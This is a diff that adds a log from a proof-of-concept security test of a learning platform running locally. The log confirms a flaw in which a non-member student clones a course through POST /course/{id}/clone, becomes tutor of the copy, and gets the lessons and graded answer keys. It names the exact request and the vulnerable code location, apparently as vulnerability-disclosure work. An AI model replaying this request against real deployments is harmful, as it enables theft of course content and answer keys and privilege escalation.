@@ -1,0 +1,18 @@
+========================================================================
+VULN-005: Course clone: cross-tenant theft (incl. answer keys) + self-TUTOR
+target: API=http://localhost:21527  dashboard=http://localhost:21526
+========================================================================
+[INFO] route course.ts:593 orgMemberMiddleware (any role); service clone.ts:213 getCourseById — no ownership check
+[SETUP] admin creates victim course X with a lesson and a graded exercise (answer key)
+[SETUP] exercise create HTTP 201
+[SETUP] course X=af357990-0a59-45c4-b14a-918ed3ef6153 lesson=7b9011ff-5083-4e15-9f41-495d9a4ffc0c secret_answer label='CORRECT-ANSWER-ans_aa8d1f85' (isCorrect=true)
+[SETUP] attacker: a STUDENT who is NOT a member of course X
+[SETUP] student user=5e65c335-826e-42b1-bde3-e3e21e2a7188; is a member of X's group? 0 (expect 0)
+[STEP] POST /course/af357990-0a59-45c4-b14a-918ed3ef6153/clone  as STUDENT  {organizationId: 48bbdff8-2ad5-46a3-a259-2ca3d52677dd}
+[INFO]   response: HTTP 200 {"success":true,"course":{"title":"Stolen t_0f9b5d71","description":"seed Victim Course X_0517b0dd","overview":"Welcome to this amazing course 🚀 ","id":"fdf9146d-6431-4241-b404-232d3e85b374","createdA
+[INFO]   cloned into new course id=fdf9146d-6431-4241-b404-232d3e85b374
+[PROOF] attacker groupmember.role_id in the CLONE's group = '2' (expected '2' = TUTOR)
+[PROOF] clone contains source lesson 'SECRET-LESSON-L_c89ce681'? count='1' (expected '1')
+[PROOF] clone contains the source's correct-answer option 'CORRECT-ANSWER-ans_aa8d1f85' with is_correct='t' (expected 't')
+==> VULN-005: CONFIRMED — STUDENT cloned a course they don't belong to → TUTOR of the copy + content + answer keys stolen
+[OK] exploit confirmed — cross-course theft of content and graded answer keys, plus self-TUTOR
